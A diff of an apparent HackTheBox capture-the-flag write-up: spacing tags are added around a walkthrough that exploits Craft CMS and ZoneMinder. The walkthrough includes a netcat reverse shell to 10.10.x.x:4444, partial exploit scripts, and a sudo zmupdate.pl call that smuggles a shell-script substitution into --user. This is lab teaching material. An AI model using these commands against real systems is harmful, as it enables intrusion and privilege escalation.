@@ -16,21 +16,21 @@ HackTheBox: Medium
 </aside>
 
 ## 1: Enumeration
-
+<br/><br/>
 - Check the active connection
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled.png' | relative_url }})
-
+<br/><br/>
 - Scanning ports
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_1.png' | relative_url }})
-
+<br/><br/>
 We can see there’s a web services running in 80 port and ssh service in 22 
-
+<br/><br/>
 ## 2: Looking around
-
+<br/><br/>
 - There is a web service powered by Craft CMS in the main page. CVE-2023-41892 is a vulnerability for this technology, we need to execute a POC for this vulnerability, but after a lot of time fixing parameters made by machine configurations we find the right version of the exploit.
-
+<br/><br/>
 ```bash
 import requests
 import re
@@ -120,83 +120,83 @@ if __name__ == "__main__":
             cmd = input("$ ")
             shell(cmd)
 ```
-
+<br/><br/>
 - 
 
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_2.png' | relative_url }})
-
+<br/><br/>
 - Make a little bit more stable the bash
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_3.png' | relative_url }})
-
+<br/><br/>
 This is pretty much it:
-
+<br/><br/>
 1. **`**rm /tmp/f**`:**
-
+<br/><br/>
 — Deletes any existing file named `/tmp/f` to ensure a fresh start.
-
+<br/><br/>
 2. **`**mkfifo /tmp/f**`:**
-
+<br/><br/>
 — Creates a named pipe (FIFO) named `/tmp/f`. A named pipe is a special type of file that allows processes to communicate.
-
+<br/><br/>
 3. **`**cat /tmp/f | /bin/bash -i 2>&1**`:**
-
+<br/><br/>
 — Reads from the named pipe (`/tmp/f`) and pipes the content to `/bin/bash` with the `-i` option for an interactive shell.
-
+<br/><br/>
 — The `2>&1` redirects standard error (file descriptor 2) to standard output (file descriptor 1), ensuring that error messages are also sent through the pipeline.
-
+<br/><br/>
 4. **`**nc 10.10.x.x 4444 >/tmp/f**`:**
-
+<br/><br/>
 — Initiates a Netcat (`nc`) connection to the IP address `10.10.x.x` on port `4444`.
-
+<br/><br/>
 — The standard output of the entire pipeline (which includes the output of the Bash shell) is redirected to the named pipe `/tmp/f`. This completes the loop, sending the shell output back into the named pipe, creating a bidirectional communication channel
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_4.png' | relative_url }})
-
+<br/><br/>
 ## 3: User flag
-
+<br/><br/>
 Got db creds 
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_5.png' | relative_url }})
-
+<br/><br/>
 Just hash with
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_6.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_7.png' | relative_url }})
-
+<br/><br/>
 ## 4: Priv esc
-
+<br/><br/>
 - We check active connections with
-
+<br/><br/>
 ```bash
 netstat -natu -nltp
 ```
-
+<br/><br/>
 There is something running locally
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_8.png' | relative_url }})
-
+<br/><br/>
 We go to /etc/nignx/sites-enable and cat zoneminder.conf
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_9.png' | relative_url }})
-
+<br/><br/>
 There is a zoneminder service running that is a monitored technology lets port fowarding with ssh
-
+<br/><br/>
 ```bash
 ssh -L port:ip:port
 ```
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_10.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_11.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_12.png' | relative_url }})
-
+<br/><br/>
 Info about zoneminder versions, lets look for some vulnerability
-
+<br/><br/>
 (CVE-202326035) POC 
-
+<br/><br/>
 ```bash
 import re
 import requests
@@ -250,36 +250,41 @@ if __name__ == "__main__":
 
     ZoneMinderExploit(args.target_url).exploit(payload)
 ```
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_13.png' | relative_url }})
-
+<br/><br/>
 Access as zoneminder
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_14.png' | relative_url }})
-
+<br/><br/>
 check for premises
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_15.png' | relative_url }})
-
+<br/><br/>
 We can update db and change others file in zm
-
+<br/><br/>
 But we are no going to update anything we are going to pass a revshell in user update
-
+<br/><br/>
 1. We can stabilize the shell using import ptty but it is not necessary, we create the revshell and pass it trought a python server
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_16.png' | relative_url }})
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_17.png' | relative_url }})
-
+<br/><br/>
 chmod 700 or chmod  +x  for permisses
-
+<br/><br/>
 We need to be listening at the port specify 
-
+<br/><br/>
 And as a final step:
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_18.png' | relative_url }})
-
+<br/><br/>
 ```bash
 sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/exploitfinalbello.sh)' --pass=ZoneMinderPassword2023
 ```
+<br/><br/>
+Machined pwned!@1
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
